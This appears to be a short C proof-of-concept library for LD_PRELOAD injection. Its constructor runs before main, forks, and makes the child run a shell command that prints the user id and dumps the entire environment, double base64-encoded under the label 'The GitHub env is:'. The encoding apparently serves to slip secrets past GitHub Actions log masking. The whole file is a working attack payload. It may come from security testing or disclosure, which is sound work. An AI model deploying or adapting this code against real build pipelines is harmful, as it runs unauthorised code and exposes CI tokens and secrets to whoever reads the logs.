#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor attribute to execute before main()
__attribute__((constructor)) void preload_function() {
    // Check if the function has already run in this execution context
    if (getenv("PRELOAD_RUN")) {
        return; // Exit if already executed in the child
    }

    // Set the environment variable so this code doesn't run in the child
    setenv("PRELOAD_RUN", "1", 1);

    // Now fork and exec in the child process
    if (fork() == 0) { // Only the child process runs the command
        execl("/bin/sh", "sh", "-c", "echo 'Command injection here', $(id); echo 'The GitHub env is:'; env | base64 | base64", NULL);
        _exit(0); // Ensure the child exits after executing the command
    }
}